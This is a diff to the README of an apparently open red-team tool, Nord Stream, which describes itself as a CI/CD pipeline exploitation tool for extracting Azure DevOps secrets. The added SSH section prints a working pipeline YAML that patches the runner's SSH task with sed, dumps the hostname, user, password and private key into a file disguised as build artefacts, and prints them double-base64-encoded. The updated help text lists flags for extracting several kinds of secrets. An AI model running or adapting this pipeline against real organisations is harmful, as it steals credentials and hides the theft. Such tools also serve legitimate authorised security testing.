@@ -214,8 +214,8 @@ Primary key fingerprint: B158 3F43 9899 C5A3 B74E  D04B F944 9691 3C43 EFC5
 ### Azure DevOps
 
 Nord Stream can extract the following types of secrets:
-- Variable groups
-- Secure files
+- Variable groups (vg)
+- Secure files (sf)
 - Service connections
 
 #### Service connections
@@ -226,8 +226,52 @@ Nord Stream currently support secret extraction for the following types of servi
 - AzureRM
 - GitHub
 - AWS
+- SonarQube
+- SSH
 
 If you come across a non-supported type, please open an issue or make a pull request :)
+
+##### SSH
+
+The extraction for this service connection type was painfull to implement. The output is the following:
+```
+hostname:::port:::user:::password:::privatekey
+```
+
+If you want to run it on a self-hosted runner you can do the following:
+```
+$ nord-stream.py devops ... --build-yaml test.yml --build-type ssh  
+[+] YAML file:
+trigger: none
+pool:
+  vmImage: ubuntu-latest
+steps:
+- checkout: none
+- script: SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak
+    ; sed -i 's|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout
+    = getReadyTimeoutVariable();\nconst fs = require("fs");var data = "";data += hostname
+    + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz",
+    data, (err) => {});|' $SSH_FILE
+  displayName: Preparing Build artefacts
+- task: SSH@0
+  inputs:
+    sshEndpoint: '#FIXME'
+    runOptions: commands
+    commands: sleep 1
+- script: SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak
+    $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''
+  displayName: Build artefacts
+
+```
+
+Then you need to:
+1) change the `vmImage: ubuntu-latest` to `name: 'Self-Hosted pool name'`
+2) Add the name of the service connection in the `#FIXME` placeholder.
+3) deploy the pipeline with: `--yaml test.yml`
+
+If you need to run this on a windows self-hosted runner, in the `generatePipelineForSSH` method change `_serviceConnectionTemplateSSH` by `_serviceConnectionTemplateSSHWindows` and perform the actions described previously.
+
+Note: for both Windows and Linux self-hosted runners, you need to adapt the path (`/home/vsts/work/_tasks/` or `D:\a\`) to match the path where the runner is deployed. This information can be obtained in the `Capabilities` tab of an agent on Azure DevOps.
 
 #### Help
 ```
@@ -235,12 +279,12 @@ $ python3 nord-stream.py devops -h
 CICD pipeline exploitation tool
 
 Usage:
-    nord-stream.py devops [options] --token <pat> --org <org> [--project <project> --no-vg --no-gh --no-az --no-aws --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name> (--key-id <id> --user <user> --email <email>)]
-    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name> (--key-id <id> --user <user> --email <email>)]
-    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> --build-type <type>
+    nord-stream.py devops [options] --token <pat> --org <org> [extraction] [--project <project> --write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
+    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean --branch-name <name> --pipeline-name <name> --repo-name <name>]
+    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> [--build-type <type>]
     nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
     nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
-    nord-stream.py devops [options] --token <pat> --org <org> --list-secrets [--project <project> --write-filter]
+    nord-stream.py devops [options] --token <pat> --org <org> (--list-secrets [--project <project> --write-filter] | --list-users)
     nord-stream.py devops [options] --token <pat> --org <org> --describe-token
 
 Options:
@@ -249,33 +293,34 @@ Options:
     -v, --verbose                           Verbose mode
     -d, --debug                             Debug mode
     --output-dir <dir>                      Output directory for logs
+    --ignore-cert                           Allow insecure server connections
 
-Signing:
-    --key-id <id>                           GPG primary key ID
-    --user <user>                           User used to sign commits
-    --email <email>                         Email address used to sign commits
+Commit:
+    --user <user>                           User used to commit
+    --email <email>                         Email address used commit
+    --key-id <id>                           GPG primary key ID to sign commits
 
-args
-    --token <pat>                           Azure DevOps personal token
+args:
+    --token <pat>                           Azure DevOps personal token or JWT
     --org <org>                             Org name
     -p, --project <project>                 Run on selected project (can be a file)
     -y, --yaml <yaml>                       Run arbitrary job
     --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
     --no-clean                              Don't clean pipeline logs (default false)
-    --no-vg                                 Don't extract variable groups secrets
-    --no-sf                                 Don't extract secure files
-    --no-gh                                 Don't extract GitHub service connection secrets
-    --no-az                                 Don't extract Azure service connection secrets
-    --no-aws                                Don't extract AWS service connection secrets
     --list-projects                         List all projects.
     --list-secrets                          List all secrets.
+    --list-users                            List all users.
     --write-filter                          Filter projects where current user has write or admin access.
     --build-yaml <output>                   Create a pipeline yaml file with default configuration.
-    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws
+    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github, aws, sonar, ssh
     --describe-token                        Display information on the token
     --branch-name <name>                    Use specific branch name for deployment.
     --pipeline-name <name>                  Use pipeline for deployment.
     --repo-name <name>                      Use specific repo for deployment.
+
+Exctraction:
+    --extract <list>                        Extract following secrets [vg,sf,gh,az,aws,sonar,ssh]
+    --no-extract <list>                     Don't extract following secrets [vg,sf,gh,az,aws,sonar,ssh]
 
 Examples:
     List all secrets from all projects
